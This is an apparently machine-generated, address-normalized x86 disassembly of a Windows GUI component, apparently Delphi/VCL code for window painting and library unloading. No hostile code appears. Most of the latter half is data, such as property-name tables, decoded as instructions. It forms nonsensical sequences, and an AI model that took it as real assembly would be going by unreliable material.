add esp 0xffffffec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44fd70
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
call sub_44f2dc
lea edx [ ebp - 0x14 ]
call sub_42977c
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ edi ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
cmp eax [ esi ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov [ edi ] edx
mov [ esi ] eax
sub_438eb8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c168
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_44c094
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
or [ ebx + 0x4 ] eax
mov eax [ ebx + 0x24 ]
and eax 0xfffffffc
or eax 0x8
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_438f0c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44f2dc
mov ecx ebp
mov edx edi
call sub_429794
cmp eax 0xffffffff
setne bl
sub_438f40
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov bl 0x1
mov eax esi
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44f2dc
mov edx esp
call sub_429734
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_438f7c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44f5e0
test al al
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
mov eax esi
call sub_44f2dc
mov ecx ebp
mov edx edi
call sub_4297c0
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_438fb4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
mov eax esi
call sub_44f5e0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
mov eax esp
push eax
xor ecx ecx
mov edx 0x1009
mov eax esi
call sub_449ca8
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebp ] eax
jmp r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4390c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_439133
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43913a
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a38
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a38
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43938c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42b6dc
mov [ esi + 0x5 ] al
call sub_4341a8
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_439bd0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4393d8
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax esi
call sub_439478
call sub_42b51c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_43940c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_439478
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4394bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43940c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_439508
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43940c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43954c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43940c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_4395b4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404854
push eax
mov eax esi
call sub_404844
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43940c
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_439618
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43969c
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4396d8
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_4396f5 ]
jmp [ eax * 4 + jump_table_43975e ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_439a64
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_439bbf
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43969c
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_439508
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_416cd4
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_439bec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_439c27
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439c2e
retn
mov eax [ rw-data ]
call sub_403290
mov eax rw-data
call sub_404008
sub_439c38
test [ ebx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x439d ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x63 ] dl
inc ebx
add [ edx - 0x63 ] ch
inc ebx
add [ eax ] dl
add al [ eax ]
add [ eax + edx * 2 + 0xe840044 ] bh
inc edx
add ah cl
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov esp 0xf400450f
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ esi + ecx - 0x2dcbffbe ] ah
inc ebx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add [ eax + edx ] cl
inc ebp
add ah ah
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add ah bh
rol [ ebx ] cl
add al 0x0
push es
mov al 0x12
mov al 0x10
mov al 0x5
add [ eax + 0x380043d6 ] bh
xlat
inc ebx
add [ edi + edx * 8 + 0x43 ] cl
add [ eax - 0x29 ] ch
inc ebx
add [ edi ] cl
push esp
inc ebx
jne r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax - 0x6fffbb0f ] dh
rol [ ebx ] cl
fdivr [ ecx - 0x3883ffbc ]
inc esp
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
inc eax
je r-xdata
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
add al dl
mov dl 0x44
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
aam 0x34
insd
inc edi
jb r-xdata
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add [ eax + edx ] cl
inc ebp
add ah ah
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add ah bh
rol [ ebx ] cl
or [ edi + eax * 2 + 0x72 ] edx
outsd
jne r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add al cl
in al dx
inc esp
add [ eax - 0x6fffbb0f ] dh
rol [ ebx ] cl
fdivr [ ecx - 0x3883ffbc ]
inc esp
add ah ch
rol [ ebx ] cl
les eax [ fs : eax + eax - 0x6c ]
retn 0x44
add [ ebx + esi * 8 - 0xc5bffbc ] al
inc esp
add [ eax + esi * 8 + 0x7d800044 ] bh
inc esp
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov esp 0xf400450f
std
inc esp
push esp
into
inc esp
jne r-xdata
add [ eax ] al
push [ eax ]
inc edx
outsd
js r-xdata
inc edx
outsd
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
test al 0x34
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
imul ebp [ edi + 0x6e ] sub_421d60
jo r-xdata
inc esp
rcl al 0x9e
inc ebx
add [ edi ] al
inc esp
rol [ eax + 0x700439d ] 0xf
push esp
inc ebx
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax + 0x4208000d ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9065646f
cmp eax [ eax + eax - 0xc ]
mov al [ eax + eax + 0x24 ]
inc edx
outsd
js r-xdata
inc ecx
add [ eax - 0x3bffbb55 ] dh
mov [ eax + eax + 0xc ] 0x89
je r-xdata
jae r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
or [ edi + eax * 2 + 0x72 ] edx
outsd
jne r-xdata
pop es
popfd
inc ebx
add [ ebp + ebx * 4 + 0x43 ] bh
add [ 0x74530800 ] dh
inc ebx
je r-xdata
add [ esi + eax * 8 ] bl
inc esp
insd
inc edi
jb r-xdata
add bh bh
call 0xfffffffff843e525
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040017 ] al
outsd
outsb
je r-xdata
jb r-xdata
add dh bh
sbb [ esp + eax * 2 ] cl
add [ eax ] 0x0
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
jb r-xdata
mov eax [ eax + eax - 0x10 ]
insb
jae r-xdata
add [ ecx + ecx * 4 ] cl
jne r-xdata
adc [ eax ] al
fadd [ eax * 2 + 0xbc00 ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
adc [ eax + 0x61 ] dl
jb r-xdata
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x1cff0001 ] ah
hlt
jle r-xdata
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
hlt
inc edx
outsd
js r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
outsb
je r-xdata
stosb [ edi ]
inc esp
add al dh
add ah ah
jle r-xdata
add ah ch
rol [ ebx ] cl
les eax [ fs : eax + eax - 0x6c ]
retn 0x44
inc esp
add [ edi + eax * 8 + 0x44 ] bh
pushfd
inc ebx
add ah ch
push ecx
inc esp
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
add [ eax ] al
add [ eax + 0x1 ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
jg r-xdata
add ah al
inc ebx
je r-xdata
adc al 0x8a
jo r-xdata
push cs
push eax
popad
je r-xdata
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
jb r-xdata
jne r-xdata
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax [ ebx + 0x6f ]
int3
add [ esi + ecx - 0x2dcbffbe ] ah
inc ebx
add [ eax ] cl
stc
inc esp
add [ esi + edi * 8 ] ah
inc esp
add [ eax - 0x3 ] dh
inc esp
add [ eax ] bh
jle r-xdata
test [ ebx ] cl
inc edx
add [ ebx + ecx + 0x42 ] bh
insb
jae r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and [ esp + eax * 2 + 0x100 ] cl
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
je r-xdata
outsb
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
add [ esi + ecx * 8 + 0x44 ] dl
add [ ebx + 0x439df4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
sahf
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
sahf
inc ebx
add [ eax ] dl
add al [ eax ]
add [ eax ] bh
pushfd
inc ebx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
hlt
push 0x6948776f
outsb
je r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
outsb
je r-xdata
adc [ eax ] al
test eax 0x4cff0001
hlt
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and eax [ eax ]
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
cmp eax [ eax + eax + 0x78 ]
je r-xdata
outsb
jpo r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
pop edx
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
mov al 0x40
push eax
outsd
jo r-xdata
inc edi
je r-xdata
adc al 0x56
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
insb
inc esp
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
add [ eax ] eax
jo r-xdata
pop eax
cmp eax 0xe00044
add bh bh
loopne r-xdata
imul esi [ ebp + 0x49 ] 0x586f666e
cmp eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
jb r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
push [ eax + 0x1ff0001 ]
inc esp
jb r-xdata
